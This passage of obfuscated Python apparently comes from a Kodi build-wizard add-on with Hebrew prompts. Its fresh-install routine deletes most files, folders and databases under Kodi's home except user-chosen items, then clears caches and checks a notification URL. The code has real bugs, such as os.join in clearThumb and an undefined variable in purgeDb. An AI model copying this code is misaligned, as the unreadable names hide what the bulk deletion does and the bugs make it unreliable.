				elif OOOO000O000O000OO [OOO0OOO0O00O0O0O0 -2 ]=='userdata'and OOOO000O000O000OO [OOO0OOO0O00O0O0O0 -1 ]=='addon_data'and 'skin.phenomenal'in OOOO000O000O000OO [OOO0OOO0O00O0O0O0 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O00OO0000000O0O0O ,O00OO0OOO0OOO000O ),xbmc .LOGNOTICE )#line:4921
				elif OOOO000O000O000OO [OOO0OOO0O00O0O0O0 -2 ]=='userdata'and OOOO000O000O000OO [OOO0OOO0O00O0O0O0 -1 ]=='addon_data'and 'plugin.video.metalliq'in OOOO000O000O000OO [OOO0OOO0O00O0O0O0 ]and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O00OO0000000O0O0O ,O00OO0OOO0OOO000O ),xbmc .LOGNOTICE )#line:4922
				elif OOOO000O000O000OO [OOO0OOO0O00O0O0O0 -2 ]=='userdata'and OOOO000O000O000OO [OOO0OOO0O00O0O0O0 -1 ]=='addon_data'and 'skin.titan'in OOOO000O000O000OO [OOO0OOO0O00O0O0O0 ]and KEEPSKIN3 =='true':wiz .log ("Install titan: %s"%os .path .join (O00OO0000000O0O0O ,O00OO0OOO0OOO000O ),xbmc .LOGNOTICE )#line:4924
				elif OOOO000O000O000OO [OOO0OOO0O00O0O0O0 -2 ]=='userdata'and OOOO000O000O000OO [OOO0OOO0O00O0O0O0 -1 ]=='addon_data'and 'pvr.iptvsimple'in OOOO000O000O000OO [OOO0OOO0O00O0O0O0 ]and KEEPPVR =='true':wiz .log ("Keep Pvr: %s"%os .path .join (O00OO0000000O0O0O ,O00OO0OOO0OOO000O ),xbmc .LOGNOTICE )#line:4925
				elif O00OO0OOO0OOO000O =='sources.xml'and OOOO000O000O000OO [-1 ]=='userdata'and KEEPSOURCES =='true':wiz .log ("Keep Sources: %s"%os .path .join (O00OO0000000O0O0O ,O00OO0OOO0OOO000O ),xbmc .LOGNOTICE )#line:4927
				elif O00OO0OOO0OOO000O =='quicknav.DATA.xml'and OOOO000O000O000OO [OOO0OOO0O00O0O0O0 -2 ]=='userdata'and OOOO000O000O000OO [OOO0OOO0O00O0O0O0 -1 ]=='addon_data'and 'script.skinshortcuts'in OOOO000O000O000OO [OOO0OOO0O00O0O0O0 ]and KEEPTVLIST =='true':wiz .log ("Keep Tv List: %s"%os .path .join (O00OO0000000O0O0O ,O00OO0OOO0OOO000O ),xbmc .LOGNOTICE )#line:4930
				elif O00OO0OOO0OOO000O =='x1101.DATA.xml'and OOOO000O000O000OO [OOO0OOO0O00O0O0O0 -2 ]=='userdata'and OOOO000O000O000OO [OOO0OOO0O00O0O0O0 -1 ]=='addon_data'and 'script.skinshortcuts'in OOOO000O000O000OO [OOO0OOO0O00O0O0O0 ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (O00OO0000000O0O0O ,O00OO0OOO0OOO000O ),xbmc .LOGNOTICE )#line:4931
				elif O00OO0OOO0OOO000O =='b-srtym-b.DATA.xml'and OOOO000O000O000OO [OOO0OOO0O00O0O0O0 -2 ]=='userdata'and OOOO000O000O000OO [OOO0OOO0O00O0O0O0 -1 ]=='addon_data'and 'script.skinshortcuts'in OOOO000O000O000OO [OOO0OOO0O00O0O0O0 ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (O00OO0000000O0O0O ,O00OO0OOO0OOO000O ),xbmc .LOGNOTICE )#line:4932
				elif O00OO0OOO0OOO000O =='x1102.DATA.xml'and OOOO000O000O000OO [OOO0OOO0O00O0O0O0 -2 ]=='userdata'and OOOO000O000O000OO [OOO0OOO0O00O0O0O0 -1 ]=='addon_data'and 'script.skinshortcuts'in OOOO000O000O000OO [OOO0OOO0O00O0O0O0 ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (O00OO0000000O0O0O ,O00OO0OOO0OOO000O ),xbmc .LOGNOTICE )#line:4933
				elif O00OO0OOO0OOO000O =='b-sdrvt-b.DATA.xml'and OOOO000O000O000OO [OOO0OOO0O00O0O0O0 -2 ]=='userdata'and OOOO000O000O000OO [OOO0OOO0O00O0O0O0 -1 ]=='addon_data'and 'script.skinshortcuts'in OOOO000O000O000OO [OOO0OOO0O00O0O0O0 ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (O00OO0000000O0O0O ,O00OO0OOO0OOO000O ),xbmc .LOGNOTICE )#line:4934
				elif O00OO0OOO0OOO000O =='x1112.DATA.xml'and OOOO000O000O000OO [OOO0OOO0O00O0O0O0 -2 ]=='userdata'and OOOO000O000O000OO [OOO0OOO0O00O0O0O0 -1 ]=='addon_data'and 'script.skinshortcuts'in OOOO000O000O000OO [OOO0OOO0O00O0O0O0 ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (O00OO0000000O0O0O ,O00OO0OOO0OOO000O ),xbmc .LOGNOTICE )#line:4935
				elif O00OO0OOO0OOO000O =='b-tlvvyzyh-b.DATA.xml'and OOOO000O000O000OO [OOO0OOO0O00O0O0O0 -2 ]=='userdata'and OOOO000O000O000OO [OOO0OOO0O00O0O0O0 -1 ]=='addon_data'and 'script.skinshortcuts'in OOOO000O000O000OO [OOO0OOO0O00O0O0O0 ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (O00OO0000000O0O0O ,O00OO0OOO0OOO000O ),xbmc .LOGNOTICE )#line:4936
				elif O00OO0OOO0OOO000O =='x1111.DATA.xml'and OOOO000O000O000OO [OOO0OOO0O00O0O0O0 -2 ]=='userdata'and OOOO000O000O000OO [OOO0OOO0O00O0O0O0 -1 ]=='addon_data'and 'script.skinshortcuts'in OOOO000O000O000OO [OOO0OOO0O00O0O0O0 ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (O00OO0000000O0O0O ,O00OO0OOO0OOO000O ),xbmc .LOGNOTICE )#line:4937
				elif O00OO0OOO0OOO000O =='b-tvknyshrly-b.DATA.xml'and OOOO000O000O000OO [OOO0OOO0O00O0O0O0 -2 ]=='userdata'and OOOO000O000O000OO [OOO0OOO0O00O0O0O0 -1 ]=='addon_data'and 'script.skinshortcuts'in OOOO000O000O000OO [OOO0OOO0O00O0O0O0 ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (O00OO0000000O0O0O ,O00OO0OOO0OOO000O ),xbmc .LOGNOTICE )#line:4938
				elif O00OO0OOO0OOO000O =='x1110.DATA.xml'and OOOO000O000O000OO [OOO0OOO0O00O0O0O0 -2 ]=='userdata'and OOOO000O000O000OO [OOO0OOO0O00O0O0O0 -1 ]=='addon_data'and 'script.skinshortcuts'in OOOO000O000O000OO [OOO0OOO0O00O0O0O0 ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (O00OO0000000O0O0O ,O00OO0OOO0OOO000O ),xbmc .LOGNOTICE )#line:4939
				elif O00OO0OOO0OOO000O =='b-yldym-b.DATA.xml'and OOOO000O000O000OO [OOO0OOO0O00O0O0O0 -2 ]=='userdata'and OOOO000O000O000OO [OOO0OOO0O00O0O0O0 -1 ]=='addon_data'and 'script.skinshortcuts'in OOOO000O000O000OO [OOO0OOO0O00O0O0O0 ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (O00OO0000000O0O0O ,O00OO0OOO0OOO000O ),xbmc .LOGNOTICE )#line:4940
				elif O00OO0OOO0OOO000O =='x1114.DATA.xml'and OOOO000O000O000OO [OOO0OOO0O00O0O0O0 -2 ]=='userdata'and OOOO000O000O000OO [OOO0OOO0O00O0O0O0 -1 ]=='addon_data'and 'script.skinshortcuts'in OOOO000O000O000OO [OOO0OOO0O00O0O0O0 ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (O00OO0000000O0O0O ,O00OO0OOO0OOO000O ),xbmc .LOGNOTICE )#line:4941
				elif O00OO0OOO0OOO000O =='b-mvzyqh-b.DATA.xml'and OOOO000O000O000OO [OOO0OOO0O00O0O0O0 -2 ]=='userdata'and OOOO000O000O000OO [OOO0OOO0O00O0O0O0 -1 ]=='addon_data'and 'script.skinshortcuts'in OOOO000O000O000OO [OOO0OOO0O00O0O0O0 ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (O00OO0000000O0O0O ,O00OO0OOO0OOO000O ),xbmc .LOGNOTICE )#line:4942
				elif O00OO0OOO0OOO000O =='mainmenu.DATA.xml'and OOOO000O000O000OO [OOO0OOO0O00O0O0O0 -2 ]=='userdata'and OOOO000O000O000OO [OOO0OOO0O00O0O0O0 -1 ]=='addon_data'and 'script.skinshortcuts'in OOOO000O000O000OO [OOO0OOO0O00O0O0O0 ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (O00OO0000000O0O0O ,O00OO0OOO0OOO000O ),xbmc .LOGNOTICE )#line:4943
				elif O00OO0OOO0OOO000O =='skin.Premium.mod.properties'and OOOO000O000O000OO [OOO0OOO0O00O0O0O0 -2 ]=='userdata'and OOOO000O000O000OO [OOO0OOO0O00O0O0O0 -1 ]=='addon_data'and 'script.skinshortcuts'in OOOO000O000O000OO [OOO0OOO0O00O0O0O0 ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (O00OO0000000O0O0O ,O00OO0OOO0OOO000O ),xbmc .LOGNOTICE )#line:4944
				elif O00OO0OOO0OOO000O =='x1122.DATA.xml'and OOOO000O000O000OO [OOO0OOO0O00O0O0O0 -2 ]=='userdata'and OOOO000O000O000OO [OOO0OOO0O00O0O0O0 -1 ]=='addon_data'and 'script.skinshortcuts'in OOOO000O000O000OO [OOO0OOO0O00O0O0O0 ]and KEEPHUBSPORT =='true':wiz .log ("Keep Hub Sport: %s"%os .path .join (O00OO0000000O0O0O ,O00OO0OOO0OOO000O ),xbmc .LOGNOTICE )#line:4946
				elif O00OO0OOO0OOO000O =='b-spvrt-b.DATA.xml'and OOOO000O000O000OO [OOO0OOO0O00O0O0O0 -2 ]=='userdata'and OOOO000O000O000OO [OOO0OOO0O00O0O0O0 -1 ]=='addon_data'and 'script.skinshortcuts'in OOOO000O000O000OO [OOO0OOO0O00O0O0O0 ]and KEEPHUBSPORT =='true':wiz .log ("Keep Hub Sport: %s"%os .path .join (O00OO0000000O0O0O ,O00OO0OOO0OOO000O ),xbmc .LOGNOTICE )#line:4947
				elif O00OO0OOO0OOO000O =='favourites.xml'and OOOO000O000O000OO [-1 ]=='userdata'and KEEPFAVS =='true':wiz .log ("Keep Favourites: %s"%os .path .join (O00OO0000000O0O0O ,O00OO0OOO0OOO000O ),xbmc .LOGNOTICE )#line:4952
				elif O00OO0OOO0OOO000O =='guisettings.xml'and OOOO000O000O000OO [-1 ]=='userdata'and KEEPSOUND =='true':wiz .log ("Keep Sound: %s"%os .path .join (O00OO0000000O0O0O ,O00OO0OOO0OOO000O ),xbmc .LOGNOTICE )#line:4954
				elif O00OO0OOO0OOO000O =='profiles.xml'and OOOO000O000O000OO [-1 ]=='userdata'and KEEPPROFILES =='true':wiz .log ("Keep Profiles: %s"%os .path .join (O00OO0000000O0O0O ,O00OO0OOO0OOO000O ),xbmc .LOGNOTICE )#line:4955
				elif O00OO0OOO0OOO000O =='advancedsettings.xml'and OOOO000O000O000OO [-1 ]=='userdata'and KEEPADVANCED =='true':wiz .log ("Keep Advanced Settings: %s"%os .path .join (O00OO0000000O0O0O ,O00OO0OOO0OOO000O ),xbmc .LOGNOTICE )#line:4956
				elif OOOO000O000O000OO [OOO0OOO0O00O0O0O0 -2 ]=='userdata'and OOOO000O000O000OO [OOO0OOO0O00O0O0O0 -1 ]=='addon_data'and 'plugin.video.sdarot.tv'in OOOO000O000O000OO [OOO0OOO0O00O0O0O0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00OO0000000O0O0O ,O00OO0OOO0OOO000O ),xbmc .LOGNOTICE )#line:4957
				elif OOOO000O000O000OO [OOO0OOO0O00O0O0O0 -2 ]=='userdata'and OOOO000O000O000OO [OOO0OOO0O00O0O0O0 -1 ]=='addon_data'and 'program.apollo'in OOOO000O000O000OO [OOO0OOO0O00O0O0O0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00OO0000000O0O0O ,O00OO0OOO0OOO000O ),xbmc .LOGNOTICE )#line:4958
				elif OOOO000O000O000OO [OOO0OOO0O00O0O0O0 -2 ]=='userdata'and OOOO000O000O000OO [OOO0OOO0O00O0O0O0 -1 ]=='addon_data'and 'plugin.video.allmoviesin'in OOOO000O000O000OO [OOO0OOO0O00O0O0O0 ]and KEEPVICTORY =='true':wiz .log ("Keep Info: %s"%os .path .join (O00OO0000000O0O0O ,O00OO0OOO0OOO000O ),xbmc .LOGNOTICE )#line:4959
				elif OOOO000O000O000OO [OOO0OOO0O00O0O0O0 -2 ]=='userdata'and OOOO000O000O000OO [OOO0OOO0O00O0O0O0 -1 ]=='addon_data'and 'plugin.video.telemedia'in OOOO000O000O000OO [OOO0OOO0O00O0O0O0 ]and KEEPTELEMEDIA =='true':wiz .log ("Keep Info: %s"%os .path .join (O00OO0000000O0O0O ,O00OO0OOO0OOO000O ),xbmc .LOGNOTICE )#line:4960
				elif OOOO000O000O000OO [OOO0OOO0O00O0O0O0 -2 ]=='userdata'and OOOO000O000O000OO [OOO0OOO0O00O0O0O0 -1 ]=='addon_data'and 'plugin.video.elementum'in OOOO000O000O000OO [OOO0OOO0O00O0O0O0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00OO0000000O0O0O ,O00OO0OOO0OOO000O ),xbmc .LOGNOTICE )#line:4963
				elif OOOO000O000O000OO [OOO0OOO0O00O0O0O0 -2 ]=='userdata'and OOOO000O000O000OO [OOO0OOO0O00O0O0O0 -1 ]=='addon_data'and 'plugin.audio.soundcloud'in OOOO000O000O000OO [OOO0OOO0O00O0O0O0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00OO0000000O0O0O ,O00OO0OOO0OOO000O ),xbmc .LOGNOTICE )#line:4965
				elif OOOO000O000O000OO [OOO0OOO0O00O0O0O0 -2 ]=='userdata'and OOOO000O000O000OO [OOO0OOO0O00O0O0O0 -1 ]=='addon_data'and 'weather.yahoo'in OOOO000O000O000OO [OOO0OOO0O00O0O0O0 ]and KEEPWEATHER =='true':wiz .log ("Keep weather: %s"%os .path .join (O00OO0000000O0O0O ,O00OO0OOO0OOO000O ),xbmc .LOGNOTICE )#line:4966
				elif OOOO000O000O000OO [OOO0OOO0O00O0O0O0 -2 ]=='userdata'and OOOO000O000O000OO [OOO0OOO0O00O0O0O0 -1 ]=='addon_data'and 'plugin.video.quasar'in OOOO000O000O000OO [OOO0OOO0O00O0O0O0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00OO0000000O0O0O ,O00OO0OOO0OOO000O ),xbmc .LOGNOTICE )#line:4967
				elif OOOO000O000O000OO [OOO0OOO0O00O0O0O0 -2 ]=='userdata'and OOOO000O000O000OO [OOO0OOO0O00O0O0O0 -1 ]=='addon_data'and 'program.apollo'in OOOO000O000O000OO [OOO0OOO0O00O0O0O0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00OO0000000O0O0O ,O00OO0OOO0OOO000O ),xbmc .LOGNOTICE )#line:4968
				elif OOOO000O000O000OO [OOO0OOO0O00O0O0O0 -2 ]=='userdata'and OOOO000O000O000OO [OOO0OOO0O00O0O0O0 -1 ]=='addon_data'and 'plugin.video.PastebinPlay'in OOOO000O000O000OO [OOO0OOO0O00O0O0O0 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00OO0000000O0O0O ,O00OO0OOO0OOO000O ),xbmc .LOGNOTICE )#line:4969
				elif OOOO000O000O000OO [OOO0OOO0O00O0O0O0 -2 ]=='userdata'and OOOO000O000O000OO [OOO0OOO0O00O0O0O0 -1 ]=='addon_data'and 'plugin.video.playlistLoader'in OOOO000O000O000OO [OOO0OOO0O00O0O0O0 ]and KEEPPLAYLIST =='true':wiz .log ("Keep playlist: %s"%os .path .join (O00OO0000000O0O0O ,O00OO0OOO0OOO000O ),xbmc .LOGNOTICE )#line:4970
				elif O00OO0OOO0OOO000O in LOGFILES :wiz .log ("Keep Log File: %s"%O00OO0OOO0OOO000O ,xbmc .LOGNOTICE )#line:4971
				elif O00OO0OOO0OOO000O .endswith ('.db'):#line:4972
					try :#line:4973
						if O00OO0OOO0OOO000O ==O000OO00OO00O00O0 and KODIV >=17 :wiz .log ("Ignoring %s on v%s"%(O00OO0OOO0OOO000O ,KODIV ),xbmc .LOGNOTICE )#line:4974
						else :os .remove (os .path .join (O00OO0000000O0O0O ,O00OO0OOO0OOO000O ))#line:4975
					except Exception as OOO0000O00O000O0O :#line:4976
						if not O00OO0OOO0OOO000O .startswith ('Textures13'):#line:4977
							wiz .log ('Failed to delete, Purging DB',xbmc .LOGNOTICE )#line:4978
							wiz .log ("-> %s"%(str (OOO0000O00O000O0O )),xbmc .LOGNOTICE )#line:4979
							wiz .purgeDb (os .path .join (O00OO0000000O0O0O ,O00OO0OOO0OOO000O ))#line:4980
				else :#line:4981
					DP .update (int (wiz .percentage (O0OOO00OO0O0O0OO0 ,O0O00O0000O00OOO0 )),'','[COLOR %s]File: [/COLOR][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00OO0OOO0OOO000O ),'')#line:4982
					try :os .remove (os .path .join (O00OO0000000O0O0O ,O00OO0OOO0OOO000O ))#line:4983
					except Exception as OOO0000O00O000O0O :#line:4984
						wiz .log ("Error removing %s"%os .path .join (O00OO0000000O0O0O ,O00OO0OOO0OOO000O ),xbmc .LOGNOTICE )#line:4985
						wiz .log ("-> / %s"%(str (OOO0000O00O000O0O )),xbmc .LOGNOTICE )#line:4986
			if DP .iscanceled ():#line:4987
				DP .close ()#line:4988
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:4989
				return False #line:4990
		for O00OO0000000O0O0O ,O0OOOO00O0OO00OO0 ,O000O0O0OO0000O0O in os .walk (OO0O00O0OOOO0O0OO ,topdown =True ):#line:4991
			O0OOOO00O0OO00OO0 [:]=[O00O000O00O00O00O for O00O000O00O00O00O in O0OOOO00O0OO00OO0 if O00O000O00O00O00O not in EXCLUDES ]#line:4992
			for O00OO0OOO0OOO000O in O0OOOO00O0OO00OO0 :#line:4993
			  DP .update (100 ,'','Cleaning Up Empty Folder: [COLOR %s]%s[/COLOR]'%(COLOR1 ,O00OO0OOO0OOO000O ),'')#line:4994
			  if O00OO0OOO0OOO000O not in ["Database","userdata","temp","addons","addon_data"]:#line:4995
			   if not (O00OO0OOO0OOO000O =='script.skinshortcuts'and KEEPSKIN =='true'):#line:4996
			    if not (O00OO0OOO0OOO000O =='skin.titan'and KEEPSKIN3 =='true'):#line:4998
			      if not (O00OO0OOO0OOO000O =='pvr.iptvsimple'and KEEPPVR =='true'):#line:4999
			       if not (O00OO0OOO0OOO000O =='plugin.video.metalliq'and KEEPMOVIELIST =='true'):#line:5000
			        if not (O00OO0OOO0OOO000O =='plugin.video.sdarot.tv'and KEEPINFO =='true'):#line:5001
			         if not (O00OO0OOO0OOO000O =='program.apollo'and KEEPINFO =='true'):#line:5002
			          if not (O00OO0OOO0OOO000O =='script.skinshortcuts'and KEEPHUBMOVIE =='true'):#line:5003
			           if not (O00OO0OOO0OOO000O =='weather.yahoo'and KEEPWEATHER =='true'):#line:5004
			            if not (O00OO0OOO0OOO000O =='plugin.video.playlistLoader'and KEEPPLAYLIST =='true'):#line:5005
			             if not (O00OO0OOO0OOO000O =='script.skinshortcuts'and KEEPHUBTVSHOW =='true'):#line:5006
			              if not (O00OO0OOO0OOO000O =='script.skinshortcuts'and KEEPHUBTV =='true'):#line:5007
			               if not (O00OO0OOO0OOO000O =='script.skinshortcuts'and KEEPHUBVOD =='true'):#line:5008
			                if not (O00OO0OOO0OOO000O =='script.skinshortcuts'and KEEPHUBKIDS =='true'):#line:5009
			                 if not (O00OO0OOO0OOO000O =='script.skinshortcuts'and KEEPHUBMUSIC =='true'):#line:5010
			                  if not (O00OO0OOO0OOO000O =='plugin.video.neptune'and KEEPINFO =='true'):#line:5011
			                   if not (O00OO0OOO0OOO000O =='plugin.video.youtube'and KEEPINFO =='true'):#line:5012
			                    if not (O00OO0OOO0OOO000O =='service.subtitles.subscenter'and KEEPINFO =='true'):#line:5013
			                     if not (O00OO0OOO0OOO000O =='script.skinshortcuts'and KEEPHUBMENU =='true'):#line:5014
			                      if not (O00OO0OOO0OOO000O =='plugin.video.allmoviesin'and KEEPVICTORY =='true'):#line:5015
			                       if not (O00OO0OOO0OOO000O =='plugin.video.telemedia'and KEEPTELEMEDIA =='true'):#line:5016
			                           if not (O00OO0OOO0OOO000O =='plugin.audio.soundcloud'and KEEPINFO =='true'):#line:5020
			                            if not (O00OO0OOO0OOO000O =='plugin.video.kodipopcorntime'and KEEPINFO =='true'):#line:5021
			                             if not (O00OO0OOO0OOO000O =='plugin.video.torrenter'and KEEPINFO =='true'):#line:5022
			                              if not (O00OO0OOO0OOO000O =='plugin.video.quasar'and KEEPINFO =='true'):#line:5023
			                               if not (O00OO0OOO0OOO000O =='script.skinshortcuts'and KEEPTVLIST =='true'):#line:5024
			                                  shutil .rmtree (os .path .join (O00OO0000000O0O0O ,O00OO0OOO0OOO000O ),ignore_errors =True ,onerror =None )#line:5026
			if DP .iscanceled ():#line:5027
				DP .close ()#line:5028
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:5029
				return False #line:5030
		DP .close ()#line:5031
		wiz .clearS ('build')#line:5032
		if over ==True :#line:5033
			return True #line:5034
		elif install =='restore':#line:5035
			return True #line:5036
		elif install :#line:5037
			buildWizard (install ,'normal',over =True )#line:5038
		else :#line:5039
			if INSTALLMETHOD ==1 :OOOOOOOO0OO00O0O0 =1 #line:5040
			elif INSTALLMETHOD ==2 :OOOOOOOO0OO00O0O0 =0 #line:5041
			else :OOOOOOOO0OO00O0O0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצגת נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR red]הצגת נתונים[/COLOR][/B]",nolabel ="[B][COLOR green]סגירה[/COLOR][/B]")#line:5042
			if OOOOOOOO0OO00O0O0 ==1 :wiz .reloadFix ('fresh')#line:5043
			else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:5044
	else :#line:5045
		if not install =='restore':#line:5046
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: מבוטלת![/COLOR]'%COLOR2 )#line:5047
			wiz .refresh ()#line:5048
def clearCache ():#line:5053
		wiz .clearCache ()#line:5054
def fixwizard ():#line:5058
		wiz .fixwizard ()#line:5059
def totalClean ():#line:5061
		wiz .clearCache ()#line:5063
		wiz .clearPackages ('total')#line:5064
		clearThumb ('total')#line:5065
		cleanfornewbuild ()#line:5066
def cleanfornewbuild ():#line:5067
		try :#line:5068
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.xml"))#line:5069
		except :#line:5070
			pass #line:5071
		try :#line:5072
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.json"))#line:5073
		except :#line:5074
			pass #line:5075
		try :#line:5076
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.TheFirstAvenger","localfile.txt"))#line:5077
		except :#line:5078
			pass #line:5079
def clearThumb (type =None ):#line:5080
	OOO00OO0OO0OO0000 =wiz .latestDB ('Textures')#line:5081
	if not type ==None :O00O0OO000O00000O =1 #line:5082
	else :O00O0OO000O00000O =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to delete the %s and Thumbnails folder?'%(COLOR2 ,OOO00OO0OO0OO0000 ),"They will repopulate on the next startup[/COLOR]",nolabel ='[B][COLOR red]Don\'t Delete[/COLOR][/B]',yeslabel ='[B][COLOR green]Delete Thumbs[/COLOR][/B]')#line:5083
	if O00O0OO000O00000O ==1 :#line:5084
		try :wiz .removeFile (os .join (DATABASE ,OOO00OO0OO0OO0000 ))#line:5085
		except :wiz .log ('Failed to delete, Purging DB.');wiz .purgeDb (OOO00OO0OO0OO0000 )#line:5086
		wiz .removeFolder (THUMBS )#line:5087
	else :wiz .log ('Clear thumbnames cancelled')#line:5089
	wiz .redoThumbs ()#line:5090
def purgeDb ():#line:5092
	O0000OOOOOOOO0000 =[];O00OOOOO0O0O00O00 =[]#line:5093
	for O00000OO00O0O00OO ,O0OOO0O0OOO00O0OO ,O00O00OO00O0O00OO in os .walk (HOME ):#line:5094
		for OOO0OO0OO0OO0OOO0 in fnmatch .filter (O00O00OO00O0O00OO ,'*.db'):#line:5095
			if OOO0OO0OO0OO0OOO0 !='Thumbs.db':#line:5096
				O00OO000OO0OOOO0O =os .path .join (O00000OO00O0O00OO ,OOO0OO0OO0OO0OOO0 )#line:5097
				O0000OOOOOOOO0000 .append (O00OO000OO0OOOO0O )#line:5098
				OOOOOO0O00O00OOOO =O00OO000OO0OOOO0O .replace ('\\','/').split ('/')#line:5099
				O00OOOOO0O0O00O00 .append ('(%s) %s'%(OOOOOO0O00O00OOOO [len (OOOOOO0O00O00OOOO )-2 ],OOOOOO0O00O00OOOO [len (OOOOOO0O00O00OOOO )-1 ]))#line:5100
	if KODIV >=16 :#line:5101
		OO00OO00OOO000O0O =DIALOG .multiselect ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,O00OOOOO0O0O00O00 )#line:5102
		if OO00OO00OOO000O0O ==None :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5103
		elif len (OO00OO00OOO000O0O )==0 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5104
		else :#line:5105
			for OOOO00OOOOO00OOOO in OO00OO00OOO000O0O :wiz .purgeDb (O0000OOOOOOOO0000 [OOOO00OOOOO00OOOO ])#line:5106
	else :#line:5107
		OO00OO00OOO000O0O =DIALOG .select ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,O00OOOOO0O0O00O00 )#line:5108
		if OO00OO00OOO000O0O ==-1 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5109
		else :wiz .purgeDb (O0000OOOOOOOO0000 [OOOO00OOOOO00OOOO ])#line:5110
def fastupdatefirstbuild (O0O00O000O0O000OO ):#line:5116
	wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]בודק אם קיים עדכון בשבילך[/COLOR]'%COLOR2 )#line:5118
	if ENABLE =='Yes':#line:5119
		if not NOTIFY =='true':#line:5120
			O00OO0O0000O0OOOO =wiz .workingURL (NOTIFICATION )#line:5121
			if O00OO0O0000O0OOOO ==True :#line:5122
				O0OO000O0O0O0OOOO ,O0O0O0OO00O000OOO =wiz .splitNotify (NOTIFICATION )#line:5123
				if not O0OO000O0O0O0OOOO ==False :#line:5125
					try :#line:5126
						O0OO000O0O0O0OOOO =int (O0OO000O0O0O0OOOO );O0O00O000O0O000OO =int (O0O00O000O0O000OO )#line:5127
						checkidupdate ()#line:5128
						wiz .setS ("notedismiss","true")#line:5129
						if O0OO000O0O0O0OOOO ==O0O00O000O0O000OO :#line:5130
							wiz .log ("[Notifications] id[%s] Dismissed"%int (O0OO000O0O0O0OOOO ),xbmc .LOGNOTICE )#line:5131
						elif O0OO000O0O0O0OOOO >O0O00O000O0O000OO :#line:5133
							wiz .log ("[Notifications] id: %s"%str (O0OO000O0O0O0OOOO ),xbmc .LOGNOTICE )#line:5134
							wiz .setS ('noteid',str (O0OO000O0O0O0OOOO ))#line:5135
							wiz .setS ("notedismiss","true")#line:5136
							wiz .log ("[Notifications] Complete",xbmc .LOGNOTICE )#line:5139
					except Exception as OO0OO0000000O0000 :#line:5140
						wiz .log ("Error on Notifications Window: %s"%str (OO0OO0000000O0000 ),xbmc .LOGERROR )#line:5141
				else :wiz .log ("[Notifications] Text File not formated Correctly")#line:5143
			else :wiz .log ("[Notifications] URL(%s): %s"%(NOTIFICATION ,O00OO0O0000O0OOOO ),xbmc .LOGNOTICE )#line:5144
		else :wiz .log ("[Notifications] Turned Off",xbmc .LOGNOTICE )#line:5145
	else :wiz .log ("[Notifications] Not Enabled",xbmc .LOGNOTICE )#line:5146
def checkidupdate ():#line:5152
				wiz .setS ("notedismiss","true")#line:5154
				O0O0O00OOOOO000OO =wiz .workingURL (NOTIFICATION )#line:5155
				OOO00OO00O00O0OO0 =" Kodi Premium"#line:5157
				OO00OOOO00000OO00 =wiz .checkBuild (OOO00OO00O00O0OO0 ,'gui')#line:5158
				OOOOOOOOOO0OOOOOO =OOO00OO00O00O0OO0 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:5159
